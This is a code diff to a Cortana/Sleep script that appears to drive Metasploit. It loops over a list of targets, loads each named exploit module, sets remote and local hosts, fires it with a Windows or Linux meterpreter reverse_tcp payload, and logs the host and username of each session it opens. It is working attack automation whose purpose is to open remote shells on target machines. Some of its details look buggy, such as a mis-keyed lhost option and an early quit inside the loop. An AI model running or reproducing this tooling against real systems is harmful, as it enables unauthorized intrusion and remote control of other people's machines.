@@ -4,19 +4,50 @@ on ready {
 
 }
 
-command cmdline_arg {
-   local('$counter @attacks');
+command arguments {
+   local('$counter @attacks $payload');
 
    $counter = $1;
-   @attacks = split(',' $2);
+   @attacks = split(';', "$2");
+   $payload = determinePayload($3);
    
-   println(@attacks);
-   fire_event_local("launch_attacks", $counter, @attacks);
+   fire_event_local("launch_attacks", $counter, @attacks, $payload);
+}
+
+on launch_attacks {
+   local('$attack $exploit $rhost $lhost $os $console $name');
+   $console = console();
+   
+   foreach $attack ($2) {
+      ($name, $rhost, $lhost, $os) = split(',', $attack);
+      $exploit = "exploit/" . $name;
+      
+      cmd($console, "use $exploit");
+      cmd_set($console, %(rhost => "$rhost", $lhost => "$lhost", payload => "$3",
+         target => "0"));
+      cmd($console, "exploit -j");
+      
+      println("loop");
+      spawn({
+         sub timer {
+            local('$console');
+            $console = console();
+            cmd($console, "jobs -K");
+            cmd_stop($console);
+            
+            sleep(10000);
+            quit();
+         }
+      });
+      quit();
+   }
+    
+   quit();
 }
 
 sub determinePayload {
    if ($1 == "windows") {
-	return "windows/meterpreter/reverse_tcp";
+	   return "windows/meterpreter/reverse_tcp";
    }
    return "linux/x86/meterpreter/reverse_tcp";
 }
@@ -30,23 +61,5 @@ on session_open {
    $host = %r["host"];
    $user = %r["username"];
    println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
-   quit();
-}
-
-#on heartbeat_15s {
- #  local('$flag $host $user $sessionNum $console @jobid');
-  # $console = console();
-  # $flag = "failure";
-  # $sessionNum = "0";
- #  $host = "";
-  # $user = "";
- #  @jobid = job_ids();
- #  println(@jobid);
- #  println("$flag" . "," . "$sessionNum" . "," . "$host" . "," . "$user");
- #  quit();
-#}
-
-on launch_attacks {
-   println("$1 => $2");
    quit();
 }
